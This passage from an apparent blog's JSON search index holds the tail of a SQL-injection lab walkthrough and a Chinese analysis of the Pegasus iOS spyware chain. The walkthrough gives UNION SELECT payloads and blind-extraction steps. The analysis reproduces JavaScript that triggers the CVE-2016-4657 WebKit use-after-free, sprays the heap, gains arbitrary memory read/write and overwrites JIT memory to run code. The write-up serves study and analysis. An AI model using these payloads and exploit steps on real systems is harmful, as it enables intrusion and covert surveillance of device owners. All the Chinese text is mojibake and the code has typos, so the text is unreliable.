on Oracle would need to look like: â€˜ UNION SELECT NULL FROM DUALâ€“.The payloads described use the double-dash comment sequence â€“ to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment. Database type QueryMicrosoft, MySQL SELECT @@versionOracle SELECT * FROM v$versionPostgreSQL SELECT version() For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the â€œCluster bombâ€ attack type, and work through all permutations of offsets and character values. Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The â€œStatusâ€ column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"http://finsenty54.github.io/tags/sql/"}]},{"title":"pegasusåˆ†æ","slug":"pegasusåˆ†æ","date":"2019-04-16T00:54:59.000Z","updated":"2019-11-18T11:59:16.146Z","comments":true,"path":"2019/04/16/pegasusåˆ†æ/","link":"","permalink":"http://finsenty54.github.io/2019/04/16/pegasusåˆ†æ/","excerpt":"PEGASUSæ”»å‡»åˆ†æå‚è€ƒ lookout reportæ”»å‡»è¿‡ç¨‹å—å®³è€…ç‚¹å‡»é“¾æ¥ä¹‹åï¼Œæ”»å‡»è€…å±•å¼€æ”»å‡»ã€‚æ”»å‡»åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µéƒ½åŒ…å«äº†æ”»å‡»æ¨¡å—ä»£ç å’Œéšè”½è½¯ä»¶ã€‚æ”»å‡»æ˜¯çº¿æ€§çš„ï¼Œæ¯ä¸ªé˜¶æ®µéƒ½ä¾èµ–äºä¸Šä¸ªé˜¶æ®µçš„ä»£ç ã€éšè”½è½¯ä»¶çš„æˆåŠŸï¼Œæ¯ä¸ªé˜¶æ®µéƒ½ä½¿ç”¨äº†å…³é”®çš„0dayæ¼æ´ï¼Œä»¥ç¡®ä¿è¿›æ”»æˆåŠŸè¿›è¡Œã€‚ é˜¶æ®µä¸€ä¼ é€å¹¶åˆ©ç”¨WebKitæ¼æ´ï¼Œé€šè¿‡HTMLæ–‡ä»¶åˆ©ç”¨WebKitä¸­çš„CVE-2016-4657æ¼æ´ã€‚ é˜¶æ®µäºŒè¶Šç‹±ã€‚åœ¨ç¬¬ä¸€é˜¶æ®µä¸­ä¼šæ ¹æ®è®¾å¤‡ï¼ˆ32/64ä½ï¼‰ä¸‹è½½ç›¸åº”çš„ï¼Œç»è¿‡åŠ å¯†æ··æ·†çš„åŒ…ã€‚æ¯æ¬¡ä¸‹è½½çš„åŒ…éƒ½æ˜¯ç”¨ç‹¬ä¸€æ— äºŒçš„keyåŠ å¯†çš„ã€‚è½¯ä»¶åŒ…å†…åŒ…å«é’ˆå¯¹iOSå†…æ ¸ä¸¤ä¸ªæ¼æ´(CVE-2016-4655å’ŒCVE-2016-4656)çš„expè¿˜æœ‰ä¸€ä¸ªç”¨æ¥ä¸‹è½½è§£å¯†ç¬¬ä¸‰é˜¶æ®µè½¯ä»¶åŒ…çš„loaderã€‚","text":"PEGASUSæ”»å‡»åˆ†æå‚è€ƒ lookout reportæ”»å‡»è¿‡ç¨‹å—å®³è€…ç‚¹å‡»é“¾æ¥ä¹‹åï¼Œæ”»å‡»è€…å±•å¼€æ”»å‡»ã€‚æ”»å‡»åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µéƒ½åŒ…å«äº†æ”»å‡»æ¨¡å—ä»£ç å’Œéšè”½è½¯ä»¶ã€‚æ”»å‡»æ˜¯çº¿æ€§çš„ï¼Œæ¯ä¸ªé˜¶æ®µéƒ½ä¾èµ–äºä¸Šä¸ªé˜¶æ®µçš„ä»£ç ã€éšè”½è½¯ä»¶çš„æˆåŠŸï¼Œæ¯ä¸ªé˜¶æ®µéƒ½ä½¿ç”¨äº†å…³é”®çš„0dayæ¼æ´ï¼Œä»¥ç¡®ä¿è¿›æ”»æˆåŠŸè¿›è¡Œã€‚ é˜¶æ®µä¸€ä¼ é€å¹¶åˆ©ç”¨WebKitæ¼æ´ï¼Œé€šè¿‡HTMLæ–‡ä»¶åˆ©ç”¨WebKitä¸­çš„CVE-2016-4657æ¼æ´ã€‚ é˜¶æ®µäºŒè¶Šç‹±ã€‚åœ¨ç¬¬ä¸€é˜¶æ®µä¸­ä¼šæ ¹æ®è®¾å¤‡ï¼ˆ32/64ä½ï¼‰ä¸‹è½½ç›¸åº”çš„ï¼Œç»è¿‡åŠ å¯†æ··æ·†çš„åŒ…ã€‚æ¯æ¬¡ä¸‹è½½çš„åŒ…éƒ½æ˜¯ç”¨ç‹¬ä¸€æ— äºŒçš„keyåŠ å¯†çš„ã€‚è½¯ä»¶åŒ…å†…åŒ…å«é’ˆå¯¹iOSå†…æ ¸ä¸¤ä¸ªæ¼æ´(CVE-2016-4655å’ŒCVE-2016-4656)çš„expè¿˜æœ‰ä¸€ä¸ªç”¨æ¥ä¸‹è½½è§£å¯†ç¬¬ä¸‰é˜¶æ®µè½¯ä»¶åŒ…çš„loaderã€‚ é˜¶æ®µä¸‰å®‰è£…é—´è°è½¯ä»¶ã€‚ç»è¿‡äº†ç¬¬äºŒé˜¶æ®µçš„è¶Šç‹±ï¼Œç¬¬ä¸‰é˜¶æ®µä¸­ï¼Œæ”»å‡»è€…ä¼šé€‰æ‹©éœ€è¦ç›‘å¬çš„è½¯ä»¶ï¼ŒæŠŠhookå®‰è£…åˆ°åº”ç”¨ä¸­ã€‚å¦å¤–ï¼Œç¬¬ä¸‰é˜¶æ®µè¿˜ä¼šæ£€æŸ¥è®¾å¤‡ä¹‹å‰æœ‰æ²¡æœ‰é€šè¿‡å…¶ä»–æ–¹å¼è¶Šç‹±è¿‡ï¼Œå¦‚æœæœ‰ï¼Œåˆ™ä¼šç§»é™¤ä¹‹å‰è¶Šç‹±åå¼€æ”¾çš„ç³»ç»Ÿè®¿é—®æƒé™ï¼Œå¦‚sshã€‚è½¯ä»¶è¿˜æœ‰ä¸€ä¸ªâ€œæ•…éšœä¿é™©â€œï¼Œå¦‚æœæ£€æµ‹åˆ°è®¾å¤‡æ»¡è¶³æŸäº›æ¡ä»¶ï¼Œè½¯ä»¶å°±ä¼šè‡ªæ¯ã€‚ ç¬¬ä¸‰é˜¶æ®µä¸­ï¼Œé—´è°ä¼šéƒ¨ç½²ä¸€ä¸ªtest222.taræ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªtaråŒ…ï¼ŒåŒ…ä¸­åŒ…å«å„ç§å®ç°å„ç§ç›®çš„çš„æ–‡ä»¶ï¼Œå¦‚å®ç°ä¸­é—´äººæ”»å‡»çš„æ ¹TLSè¯ä¹¦ã€é’ˆå¯¹Viberã€Whatsappçš„å—…æ¢åº“ã€ä¸“é—¨ç”¨äºé€šè¯å½•éŸ³çš„åº“ç­‰ã€‚ CVE-2016-4657ç¬¬ä¸€é˜¶æ®µç”¨åˆ°äº†WebKitâ€™s JavaScriptCore library ä¸­çš„æ¼æ´CVE-2016-4657ã€‚è®©Safariè¿è¡Œä¸€æ®µJavaScript payloadï¼Œä»¥æ­¤æ¥è·å¾—Safari WebContentè¿›ç¨‹çš„ä»£ç æ‰§è¡Œæƒã€‚ èƒŒæ™¯MarkedArgumentBufferä¸­çš„slowAppend()å‡½æ•°ä¸­å­˜åœ¨è¿™ä¸ªæ¼æ´ï¼Œå¹¶ä¸”å¯ä»¥åœ¨é™æ€æ–¹æ³•definePropertries()ä¸­ä½¿ç”¨MarkedArgumentBufferæ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚definePropertries()æ¥å—ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡çš„å¯æšä¸¾å˜é‡æ„æˆè¦åœ¨å¦ä¸€ä¸ªç›®æ ‡å¯¹è±¡ä¸Šå®šä¹‰æˆ–ä¿®æ”¹çš„å±æ€§çš„æè¿°ç¬¦ã€‚ç®—æ³•é“¾æ¥è¿™äº›å˜é‡å’Œç›®æ ‡å¯¹è±¡ï¼ŒåŸºäºå˜é‡åˆ—è¡¨è¿›è¡Œä¸¤æ¬¡è¿­ä»£ã€‚åœ¨ç¬¬ä¸€ä¸ªéƒ¨åˆ†ï¼Œæ£€æŸ¥æ¯ä¸ªå˜é‡çš„æ ¼å¼ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæœ‰é»˜è®¤å€¼çš„PropertyDescriptorå¯¹è±¡ã€‚ 1234567891011121314size_t numProperties = propertyName.size();Vector&lt;PropertyDescriptor&gt; descriptors;size_t numProperties = propertyName.size();Vector&lt;PropertyDescriptor&gt; descriptors;MarkedArgumentBuffer markBuffer;for(size_t i =0;i&lt;numProperties;i++)&#123; JSValue prop = properties-&gt;get(exec,propertyNames[i]); if(exec-&gt;hadException()) return jsNull(); PropertyDescriptor descriptor; if(!toPropertyDescriptor(exec, prop,descriptor)) return jsNull(); descriptors.append(descriptor);&#125; å¦‚æœæ¯ä¸€ä¸ªå˜é‡éƒ½æ˜¯æœ‰æ•ˆçš„ï¼Œé‚£ä¹ˆç¬¬äºŒéƒ¨åˆ†å°±ä¼šæ‰§è¡Œã€‚è¿™ä¸ªéƒ¨åˆ†å°†ç”¨æˆ·æä¾›çš„å±æ€§å˜é‡ä¸ç›®æ ‡å¯¹è±¡ç»“åˆåœ¨ä¸€èµ·ï¼Œé€šè¿‡defineOwnProperty()å®ç°ã€‚ 1234567for(size_t i=0;i&lt;numProperties; i++)&#123; Identifier propertyName = propertyNames[i]; if(exec-&gt;propertyName().isPrivateName(properName)) continue; object-&gt;methodTable(exec-&gt;vm())-&gt;defineOwnProperty(object, exec, propertyName,descriptors[i],true);&#125; è¿™ä¸ªæ–¹æ³•å¯èƒ½è°ƒç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„JavaScriptæ–¹æ³•ï¼ˆä½¿ç”¨å·²å®šä¹‰çš„å±æ€§ï¼‰ã€‚è¿™æ ·ï¼Œå†…å­˜å›æ”¶ä¼šè¢«è§¦å‘ï¼Œå¯¼è‡´æœªæ ‡è®°çš„å †å¤‡ä»½é‡æ–°åˆ†é…ã€‚å› æ­¤ï¼Œå¯¹descriptorå‘é‡PropertyDescriptorå­˜å‚¨çš„å¯¹è±¡çš„å¼•ç”¨è¦ç‹¬ç«‹æ ‡è®°ï¼Œç¡®ä¿ä¸è¢«å›æ”¶ã€‚è¿™é‡Œï¼Œä½¿ç”¨äº†MarkedArgumentBufferï¼Œä¸´æ—¶å­˜å‚¨å˜é‡å€¼ï¼Œé˜²æ­¢è¢«å›æ”¶ã€‚ é¦–å…ˆï¼Œæ¥ç†è§£JavaScriptCoreçš„åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œå½“å¯¹è±¡ä¸åœ¨è¢«ä½¿ç”¨ï¼Œæˆ–è€…WebContentjinè¿›ç¨‹å ç”¨æ›´å¤šå†…å­˜çš„æ—¶å€™ä¼šå›æ”¶å†…å­˜ã€‚ç³»ç»Ÿä¼šéå†æ ˆï¼Œç¡®å®šå¯¹è±¡æ˜¯å¦è¢«å¼•ç”¨ã€‚å †ä¸­ä¹Ÿå¯èƒ½å¼•ç”¨å¯¹è±¡ï¼Œä½†åªåœ¨ç‰¹æ®Šæƒ…å†µä¸­ã€‚ MarkedArgumentBufferç»´æŒä¸€ä¸ªinlineæ ˆè¡¨ï¼Œç”±å„ä¸ªå€¼ç»„æˆã€‚ä½†è¿›è¡Œåƒåœ¾å›æ”¶æ—¶ï¼Œæ¯ä¸ªå€¼ä¼šè¢«æ ‡è®°ï¼Œå…¶ä»£è¡¨çš„å¯¹è±¡å°±ä¼šé¿å…å›æ”¶é‡Šæ”¾ã€‚ 12345678910111213141516171819202122232425262728293031class MarkedArgumentBuffer &#123; ... private: static const size_t inlineCapacity=8; ... public: ... MarkedArgumentBuffer() :m_size(0) ,m_capacity(inlineCapacity) ,m_buffer(m_inlineBuffer) ,m_markSet(0) &#123; &#125; ... void append(JSValue v)&#123; if(m_size &gt;= m_capacity) return slowAppend(v); slotFor(m_size)=JSValue::encode(v); ++m_size; &#125; ... private: ... int m_size; int m_capacity; EncodedJSValue m_inlineBuffer[inlineCapacity]; EncodeedJSValue* m_buffer; ListSet* m_markSet;&#125; inlineæ ˆåªèƒ½å­˜8ä¸ªå€¼ã€‚å½“å‘MarkedArgumentBufferæ·»åŠ ç¬¬ä¹ä¸ªå€¼æ—¶ï¼Œå°±ç§»åˆ°å †ä¸­ï¼Œèƒ½å¤Ÿå­˜å‚¨çš„å€¼ä¹Ÿæ‰©å¤§äº†ã€‚123456789101112void MarkedArgumentBuffer::slowAppend(JSValue v)&#123; int newCapacity = m_capacity*4; EncodedJSValue* newBuffer = new EncodeedJSValue[newCapacity]; for(int i=0;i&lt;m_capacity;++i) newBuffer[i]=m_buffer[i]; if (EncodedJSValue* base=mallocBase()) delete [] base; m_buffer=newBuffer; m_capacity=newCapacity;&#125; ä¸€æ—¦ç§»åŠ¨åˆ°å †ä¸­ï¼Œè¿™äº›å€¼å°±ä¸å†è¢«åƒåœ¾å›æ”¶æœºåˆ¶ä¿æŠ¤ã€‚MarkedArgumentBufferé‡Œçš„å€¼ä¼šæ·»åŠ åˆ°å †ä¸­çš„m_markListSetå¹¶è¢«æ ‡è®°ï¼Œç¡®ä¿ä¸ä¼šé‡Šæ”¾å›æ”¶ã€‚å½“MarkedArgumentBufferç§»åˆ°å †ä¸­æ—¶ï¼Œä¹Ÿè¦ç§»åŠ¨markListSetä¸­ã€‚1234567891011121314//As long as our size stays within our Vetor's inline//capacity, all our values are allocated on the stack, and //therefore don't need explicit marking. Once our size exceeds //our Vector's inline capacity, though, our values move to the //heap, where they do need explicit marking.for (int i=0; i&lt;m_size;++i)&#123; Heap* heap=Heap::heap(JSValue::decode(slotFor(i))); if(!heap) continue; m_markSet = &amp;heap-&gt;markListSet(); m_markSet-&gt;add(this); break;&#125; ä¸Šé¢çš„ä»£ç è¯·æ±‚äº†ä¸€ä¸ªå †ï¼ŒæŠŠMarkedArgumentBufferæ·»åŠ åˆ°å †ä¸­çš„markListSetã€‚ä½†åªæœ‰ç¬¬ä¹ä¸ªå€¼åŠ å…¥MarkedArgumentBufferæ‰è°ƒç”¨ã€‚12345inline Heap* Heap::heap(const JSValue v)&#123; if(!v.isCell()) return 0; return heap(v.asCell());&#125; JSValueæœ‰ä¸€ä¸ªtagï¼Œè¯´æ˜å®ƒç¼–ç çš„å€¼çš„ç±»å‹ã€‚åœ¨ä¸€ä¸ªå¤æ‚çš„å¯¹è±¡ä¸­ï¼Œtagä¸ºCellTagï¼ŒJSValueåˆ›å»ºä¸€æŒ‡é’ˆæŒ‡å‘å †ä¸­çš„å€¼ã€‚å¯¹ç®€å•ç±»å‹æ¥è¯´ï¼Œå˜é‡å¯ä»¥ç›´æ¥è§£ç æˆJSValueï¼ˆä¾‹å¦‚æ•´å½¢ï¼Œå¸ƒå°”å‹ï¼Œnullï¼Œè¿˜æœ‰æœªå®šä¹‰çš„ï¼‰ï¼Œåœ¨å †ä¸­å­˜å‚¨è¿™æ ·çš„å€¼æ˜¯å¤šä½™çš„ï¼Œè¿˜ä¼šåˆ›å»ºä¸€ä¸ªtagã€‚JSValue::isCell() å‡½æ•°å†³å®šæ˜¯å¦åœ¨å †ä¸­åˆ›å»ºæŒ‡é’ˆæŒ‡å‘å•å…ƒæ ¼ã€‚å› ä¸ºç®€å•ç±»å‹ä¸ä¼šæŒ‡å‘å †ï¼Œä¸ºè¿™äº›ç±»å‹æŒ‡å®šå †æ²¡æœ‰æ„ä¹‰ï¼Œåªä¼šè¿”å›nullã€‚123inline bool JSValue::isCell() const&#123; return !(u.asInt64&amp;TagMask);&#125; å› æ­¤ï¼Œå¦‚æœè¦æ·»åŠ åˆ°MarkedArgumentBufferçš„ç¬¬ä¹ä¸ªå€¼ä¸æ˜¯ä¸€ä¸ªå †å¤‡ä»½å€¼ï¼Œå½“è¯·æ±‚å †æ—¶ä¼šè¿”å›NULLï¼Œ MarkedArgumentBufferä¹Ÿä¸ä¼šæ·»åŠ åˆ°å †markListSetä¸­ã€‚MarkedArgumentBufferå°±ä¸åœ¨èµ·ä½œç”¨ï¼Œç¬¬ä¹ä¸ªå€¼ä»¥åçš„å€¼å¯ä»¥è¢«é‡Šæ”¾å›æ”¶ã€‚descriptorå‘é‡é‡Œçš„å †å€¼ï¼Œè¢«å¼•ç”¨åï¼Œå¯èƒ½ä¼šè¢«æ±¡æŸ“ã€‚å®é™…ä¸Šï¼Œå¯¹è¿™äº›å€¼çš„å¦ä¸€ä¸ªå¼•ç”¨ä»ç„¶å­˜åœ¨ï¼ˆdefineDescriptor()æœ‰JavaScriptçš„å˜é‡ï¼‰ã€‚åœ¨åƒåœ¾å›æ”¶å‰ï¼Œä½™ä¸‹çš„JSValueçš„å¼•ç”¨å¿…é¡»å…ˆç§»å»ï¼Œä»¥ä½¿descriptorå‘é‡é‡Œçš„å¼•ç”¨è¢«æ±¡æŸ“ã€‚è°ƒç”¨defineOwnDescriptor()ä¸€å®šä¼šè°ƒç”¨åŸºäºå±æ€§å€¼çš„ç”¨æˆ·æ§åˆ¶çš„æ–¹æ³•ã€‚ç»“æœï¼Œæœ€åä¸€ä¸ªå¯¹ä¸€å±æ€§å€¼çš„å¼•ç”¨å¯ä»¥è¢«ç”¨æˆ·å®šä¹‰çš„JavaScriptä»£ç ç§»å»ã€‚å¦‚æœåƒåœ¾å›æ”¶åœ¨ç§»å»ä¸€ç‰¹å®šå€¼çš„æ‰€æœ‰å¼•ç”¨å’Œç›®æ ‡å¯¹è±¡desceiptorå‘é‡é‡Œçš„å€¼æ—¶è¢«è§¦å‘ï¼Œè¿™äº›é‡Šæ”¾äº†çš„ç©ºé—´ä¼šä½œä¸ºä¸€ä¸ªå˜é‡å­˜å‚¨åœ¨ç›®æ ‡å¯¹è±¡ä¸Šã€‚ æ”»å‡»Pegasusé€šè¿‡å‘defineProperties()å‡½æ•°ä¼ å…¥ä¸€ç³»åˆ—ç²¾å¿ƒåˆ¶ä½œçš„å˜é‡æ¥è§¦å‘è¿™ä¸ªæ¼æ´ã€‚å½“è¿™äº›ç‹¬ç«‹å˜é‡è¿ç»­æ·»åŠ åˆ°MarkedArgumentBufferï¼Œè¿™ä¸ªæ¼æ´å°±ä¼šè§¦å‘ï¼Œå¦‚æœåƒåœ¾å›æ”¶åœ¨å…³é”®æ—¶å€™åŠæ—¶è§¦å‘ï¼ŒJSArrayä¼šé”™è¯¯é‡Šæ”¾ã€‚å› ä¸ºåƒåœ¾å›æ”¶ä¸ä¸€å®šä¼šè¢«è§¦å‘ï¼Œæ‰€ä»¥é‡å¤æ”»å‡»ä»¥è§¦å‘é”™è¯¯é‡Šæ”¾å’Œå†åˆ†é…ï¼ˆä¼šå°è¯•åæ¬¡ï¼‰ï¼Œè¿˜ä¼šæµ‹è¯•æ˜¯å¦ä¸€ä¸ªè¢«æ±¡æŸ“çš„å¼•ç”¨å·²ç»æˆåŠŸè·å¾—ã€‚å‡è®¾åƒåœ¾å›æ”¶æ­£ç¡®è§¦å‘ï¼Œé‚£ä¹ˆå¦ä¸€ä¸ªå¯¹è±¡å°±ä¼šåˆ†é…åœ¨æ±¡æŸ“çš„JSArrayä¹‹ä¸Šã€‚æ¥ç€ï¼Œè®¾ç½®å¯ä»¥è·å¾—æœ¬åœ°ä»£ç æ‰§è¡Œæƒçš„å·¥å…·ï¼Œå³è¯»å†™æƒé™ï¼Œè·å–ä»»æ„JavaScriptå¯¹è±¡ä½ç½®ã€‚ä¸€æ—¦è¿™äº›æ­¥éª¤éƒ½å®Œæˆäº†ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªpayloadå¯æ‰§è¡Œä»£ç é›†ã€‚ è®¾ç½®è§¦å‘æ¼æ´æ”»å‡»ä½¿ç”¨ä¸€ä¸ªJSArrayå¯¹è±¡è§¦å‘æ¼æ´ä»£ç å—ï¼Œè·å¾—ä»»æ„ä»£ç æ‰§è¡Œæƒã€‚ä¸‹é¢è¿™æ®µä»£ç è§¦å‘æ¼æ´ã€‚123456789101112131415161718192021222324var arr=new Array(2047);var not_number=&#123;&#125;;not_number.toString=function()&#123; arr=null; props[\"stale\"]['value']=null; ...//Trigger garbage collection and reallocation over stale object return 10;&#125;;var props=&#123; p0:&#123;value:0&#125;, p1:&#123;value:1&#125;, p2:&#123;value:2&#125;, p3:&#123;value:3&#125;, p4:&#123;value:4&#125;, p5:&#123;value:5&#125;, p6:&#123;value:6&#125;, p7:&#123;value:7&#125;, p8:&#123;value:8&#125;, length:&#123;value:not_number&#125;, stale:&#123;value:arr&#125;, after:&#123;value:666&#125;&#125;;var target=[];Object.defineProperties(target,props); ç»è¿‡ç‰¹åˆ«ç²¾å¿ƒç¼–æ’çš„propså¯¹è±¡è§¦å‘slowAppend()å†…çš„æ¼æ´ã€‚å½“ç¬¬ä¹ä¸ªå±æ€§å€¼æ·»åŠ åˆ°MarkedArgumentBuffer(P8)ï¼ŒslowAppend()å°†æ— æ³•è·å¾—å †åœ°å€ï¼ˆå› ä¸ºè¿™ä¸ªå€¼æ˜¯ä¸€ä¸ªç®€å•ç±»å‹ï¼Œå³æ•´å½¢ï¼Œå¹¶ä¸”åŸå…ˆå †ä¸Šæ²¡æœ‰è¿™ä¸ªå€¼ï¼‰ã€‚é‚£ä¹ˆï¼ŒMarkedArgumentBufferå°±ä¸èƒ½ä¿æŠ¤å †å¤‡ä»½å€¼ï¼ˆnot_numberå’Œarrï¼‰ï¼Œå½“åƒåœ¾å›æ”¶æ—¶å°±ä¼šè¢«é‡Šæ”¾ã€‚ å½“defineOwnDescriptor()æ¥å—è¿™ä¸ªé•¿å±æ€§å€¼ï¼Œå®ƒä¼šå°è¯•å°†è¿™ä¸ªå€¼ï¼ˆnot_numberï¼‰è½¬å˜ä¸ºä¸€ä¸ªæ•°å­—ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼ŒtoString()è¢«è°ƒç”¨ï¼Œç§»å»arrçš„åä¸¤é¡¹å¼•ç”¨ã€‚ä¸€æ—¦ç§»å»ï¼ŒJSArrayå°†å–æ¶ˆæ ‡è®°ï¼Œä¸‹ä¸€æ¬¡åƒåœ¾å›æ”¶å°±ä¼šé‡Šæ”¾æ•´ä¸ªå¯¹è±¡ã€‚Pegasusé€šè¿‡toString()æ–¹æ³•ç”³è¯·åˆ†é…å†…å­˜ç©ºé—´ï¼Œä¿ƒä½¿åƒåœ¾å›æ”¶è¿è¡Œï¼ˆé‡Šæ”¾arrå¯¹è±¡ï¼‰ã€‚123456789101112131415var attempts=new Array(4250000);var pressure=new Array(100);...not_number.toString=function()&#123; ... for(var i=0;i&lt;pressure.length;i++)&#123; pressure[i]=new Unit32Array(262144); &#125; var buffer=new ArrayBuffer(80); var unitArray=new Unit32Array(buffer); unitArray[0]=0xAABBCCDD; for(i =0;i&lt;attempts.length;i++)&#123; attempts[i]=new Unit32Array(buffer); &#125;&#125; attemptsæ¯ä¸€é¡¹éƒ½åœ¨åŒä¸€æ®µç¼“å†²åŒºä¸Šåˆ†é…4.25 millionä¸ªUnit32Arrayã€‚åœ¨arrå¯¹è±¡ä½¿ç”¨çš„åŒä¸€å†…å­˜åŒºå†åˆ†é…ä¸€ç³»åˆ—çš„Unit32Arrayã€‚ å®Œæˆåï¼Œä¼šæ£€æµ‹åƒåœ¾å›æ”¶æ˜¯å¦è§¦å‘ã€‚1234567var before_len=arr.length;Object.defineProperties(target,props);stale=targets.stale;var after_len=stale.length;if(before_len==after_len)&#123; throw new RecoverableException(8);&#125; å¦‚æœJSArrayçš„é•¿åº¦æ²¡æœ‰æ”¹å˜ï¼Œè¦ä¹ˆåƒåœ¾å›æ”¶æ²¡æœ‰è§¦å‘ï¼Œè¦ä¹ˆæ˜¯Unit32Arrayæ²¡æœ‰åœ¨staleç›¸åŒåœ°å€ä¸Šåˆ†é…ç©ºé—´ã€‚è¿™ç§æƒ…å†µï¼Œæ”»å‡»å°±å¤±è´¥äº†ï¼Œä½†ä¼šå†å°è¯•ã€‚ è·å–ä»»æ„è¯»å†™åŸè¯­å‡è®¾æ”»å‡»å·²ç»æˆåŠŸäº†ï¼Œé‚£ä¹ˆåœ¨åŒä¸€æ®µçš„å†…å­˜ä¸­æœ‰ä¸¤ä¸ªä¸åŒç±»å‹çš„å¯¹è±¡ã€‚ç¬¬ä¸€ä¸ªæ˜¯JSArray(å·²æ±¡æŸ“)ï¼Œç¬¬äºŒä¸ªæ˜¯ä¼—å¤šå·²åˆ†é…çš„Unit32Arraysä¸­çš„ä¸€ä¸ªï¼ˆå®é™…ä¸Šï¼Œé»˜è®¤ç±»å‹æ˜¯ JSGenericTypedArrayViewï¼‰ã€‚é€šè¿‡å¯¹æ±¡æŸ“å¯¹è±¡çš„è¯»å†™ï¼Œå¯ä»¥è¯»å–æˆ–ç ´ç¯JSGenericTypedArrayViewçš„æˆå‘˜å˜é‡ã€‚ç‰¹åˆ«åœ°ï¼Œåœ¨JSArrayå’ŒJSGenericTypedArrayViewé•¿åº¦é‡å çš„åœ°æ–¹ï¼Œå†™å…¥ä¸€ä¸ªåç§»é‡ï¼Œå°±å¯ä»¥æœ‰æ•ˆåœ°è®¾ç½®Unit32Arrayçš„é•¿åº¦ä¸º0xFFFFFFFFã€‚ç ´ç¯è¿™ä¸ªå€¼ï¼Œå¯ä»¥å°†è¿™ä¸ªarrayä½œä¸ºWebContentè¿›ç¨‹çš„å…¨éƒ¨è™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆå³ä»»æ„è¯»å†™åŸè¯­ï¼‰ã€‚ æ”»å‡»éœ€è¦ç¡®å®šå·²åˆ†é…çš„ä¼—å¤šUnit32Arrayä¸­å“ªä¸€ä¸ªä¸æ±¡æŸ“å¯¹è±¡åŒ¹é…ã€‚å¯ä»¥ä¸€ä¸€æµ‹è¯•ï¼Œå¹¶æ£€æŸ¥é•¿åº¦æ˜¯å¦è¢«æ”¹ä¸º0xFFFFFFFFã€‚æ‰€æœ‰å…¶ä»–æ•°ç»„ä»å°†ä¿ç•™åŸå§‹çš„å¤‡ä»½ArrayBufferã€‚123456789for(x=attempts.length-1;x&gt;=1;x--)&#123; if(attempts[x].length != 80/4)&#123; if(attempts[x].length==0xFFFFFFFF)&#123; memory_view=attempts[x]; ... break; &#125; &#125;&#125; è·å–å¯¹è±¡åœ°å€å®Œæˆæ”»å‡»çš„æœ€åç»„ä»¶éœ€è¦èƒ½å¤Ÿè·å–ä»»æ„JavaScriptå¯¹è±¡çš„åœ°å€ã€‚Pegasusç”¨ç ´åUnit32Arrayçš„æ–¹æ³•æ¥è·å–åœ°å€ã€‚å‘å¯¹è±¡å†™å…¥ä¸€åç§»å€¼ï¼ŒUnit32Arrayçš„ç¼“å†²åŒºå°±è¢«ç ´åï¼Œå¹¶æŒ‡å‘ç”¨æˆ·æ§åˆ¶çš„JSArrayã€‚JSArrayçš„ç¬¬ä¸€ä¸ªå…ƒç´ è®¾ç½®æˆéœ€è¦çˆ†ç ´çš„JavaScriptå¯¹è±¡ï¼ˆé€šè¿‡æŸåæŒ‡å‘uint32æ•°ç»„çš„åº•å±‚å­˜å‚¨çš„æŒ‡é’ˆï¼‰ï¼Œå¯ä»¥ä»Unit32Arrayä¸­è¯»å–åœ°å€ä¿¡æ¯ã€‚ æœ¬åœ°ä»£ç æ‰§è¡ŒPegasusç¬¬ä¸€æ®µæ®µä½™ä¸‹è¦åšçš„æ˜¯åˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œä»£ç é›†ï¼Œè¿™ä¸ªé›†åˆåŒ…å«äº†è¦è¢«æ‰§è¡Œçš„æ¶æ„ä»£ç ã€‚åˆ›å»ºä¸€ä¸ªJSFunctionå¯¹è±¡ï¼ˆåŒ…å«ä¸Šç™¾ä¸ªä¹‹åä¼šè¢«é‡å†™çš„try/catchå—ï¼‰å®Œæˆè¿™é¡¹å·¥ä½œã€‚ä¸ºç¡®ä¿JITç¼–è¯‘æˆæœ¬æœºä»£ç ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¢«é‡å¤è°ƒç”¨ã€‚è¿™æ ·ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¢«æ ‡è®°ä¸ºä¼šç»å¸¸è°ƒç”¨å¹¶ä¸ä¼šé‡Šæ”¾çš„é«˜ä¼˜å…ˆçº§ä»£ç ã€‚å› ä¸ºJavaScriptCodeç¼–è¯‘å™¨è¿è¡ŒJSTedä»£ç çš„ç‹¬ç‰¹æ–¹å¼ï¼Œä»£ç ä¼šå­˜å‚¨åœ¨å¯ä»¥è¯»å†™è¿è¡Œçš„å†…å­˜åŒºã€‚12345678var body=' 'for (var k=0;k&lt;0x600;k++)&#123; body+='try &#123;&#125; catch(e);';&#125;var to_overwrite=new Function('a',body);for(var i=0;i&lt;0x1000;i++)&#123; to_overwrite();&#125; å¯ä»¥è·å¾—JSFunctionå¯¹è±¡çš„åœ°å€ï¼Œå¹¶ä¸”é€šè¿‡è¯»å–ä¸åŒçš„æˆå‘˜å˜é‡ï¼Œå¯ä»¥è·å¾—RWXçš„æ˜ å°„ã€‚æ¥ç€JSFedçš„try/catchå—ä¼šè¢«æ¶æ„ä»£ç æ›¿æ¢ã€‚é€šè¿‡è°ƒç”¨to_overwrite()å‡½æ•°ï¼Œå¯ä»¥è½»æ¾å–å¾—ä»»æ„ä»£ç æ‰§è¡Œæƒã€‚ 